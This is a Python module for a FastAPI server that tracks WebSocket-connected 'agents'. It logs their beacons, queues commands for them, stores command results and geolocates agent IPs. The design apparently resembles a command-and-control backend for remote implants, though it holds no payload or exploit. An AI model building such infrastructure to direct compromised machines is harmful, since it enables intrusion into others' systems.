"""In-memory agent connection manager for WebSocket-connected agents"""

from fastapi import WebSocket
from datetime import datetime
from typing import Dict, List
import logging
import asyncio
import httpx

logger = logging.getLogger(__name__)


async def lookup_geoip(ip: str) -> dict:
    """Lookup country/city from IP using free API"""
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp")
            if resp.status_code == 200:
                return resp.json()
    except Exception:
        pass
    return {}


class AgentConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.agent_info: Dict[str, dict] = {}
        self.command_queues: Dict[str, List[dict]] = {}
        self.beacon_log: Dict[str, List[dict]] = {}
        self.command_history: Dict[str, List[dict]] = {}
        self._cmd_counter = 0

    async def connect(self, agent_id: str, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[agent_id] = websocket
        if agent_id not in self.command_queues:
            self.command_queues[agent_id] = []
        if agent_id not in self.beacon_log:
            self.beacon_log[agent_id] = []
        self.agent_info[agent_id] = {
            "connected_at": datetime.utcnow().isoformat(),
            "last_seen": datetime.utcnow().isoformat(),
            "status": "connected",
        }
        logger.info(f"Agent {agent_id} connected (total active: {len(self.active_connections)})")

    def disconnect(self, agent_id: str):
        self.active_connections.pop(agent_id, None)
        if agent_id in self.agent_info:
            self.agent_info[agent_id]["status"] = "disconnected"
            self.agent_info[agent_id]["disconnected_at"] = datetime.utcnow().isoformat()
        logger.info(f"Agent {agent_id} disconnected (total active: {len(self.active_connections)})")

    def get_active_agents(self) -> dict:
        result = {}
        for agent_id in self.active_connections:
            info = self.agent_info.get(agent_id, {}).copy()
            info["pending_commands"] = len(self.command_queues.get(agent_id, []))
            info["total_beacons"] = len(self.beacon_log.get(agent_id, []))
            result[agent_id] = info
        return result

    def queue_command(self, agent_id: str, command: dict) -> int:
        if agent_id not in self.command_queues:
            self.command_queues[agent_id] = []
        if agent_id not in self.command_history:
            self.command_history[agent_id] = []
        self._cmd_counter += 1
        cmd_id = self._cmd_counter
        entry = {
            "cmd_id": cmd_id,
            "command": command,
            "queued_at": datetime.utcnow().isoformat(),
            "status": "queued",
            "output": None,
            "error": None,
        }
        self.command_queues[agent_id].append(entry)
        self.command_history[agent_id].append(entry)
        if len(self.command_history[agent_id]) > 200:
            self.command_history[agent_id] = self.command_history[agent_id][-200:]
        logger.info(f"Command queued for agent {agent_id} (id={cmd_id}, queue size: {len(self.command_queues[agent_id])})")
        return cmd_id

    def get_pending_commands(self, agent_id: str) -> List[dict]:
        commands = self.command_queues.get(agent_id, [])
        self.command_queues[agent_id] = []
        return commands

    def update_agent_info(self, agent_id: str, info: dict):
        if agent_id not in self.agent_info:
            self.agent_info[agent_id] = {}
        self.agent_info[agent_id].update(info)
        self.agent_info[agent_id]["last_seen"] = datetime.utcnow().isoformat()

    def log_beacon(self, agent_id: str, envelope: dict):
        if agent_id not in self.beacon_log:
            self.beacon_log[agent_id] = []
        self.beacon_log[agent_id].append({
            "received_at": datetime.utcnow().isoformat(),
            "envelope_version": envelope.get("v"),
            "message_index": envelope.get("idx"),
            "data_size": len(envelope.get("data", "")),
        })
        if len(self.beacon_log[agent_id]) > 100:
            self.beacon_log[agent_id] = self.beacon_log[agent_id][-100:]

    def store_command_result(self, agent_id: str, cmd_id: int, status: str, output: str, error: str = None):
        for entry in self.command_history.get(agent_id, []):
            if entry["cmd_id"] == cmd_id:
                entry["status"] = status
                entry["output"] = output
                entry["error"] = error
                entry["completed_at"] = datetime.utcnow().isoformat()
                break

    def get_command_history(self, agent_id: str) -> List[dict]:
        return self.command_history.get(agent_id, [])[-50:]

    def is_connected(self, agent_id: str) -> bool:
        return agent_id in self.active_connections


agent_manager = AgentConnectionManager()
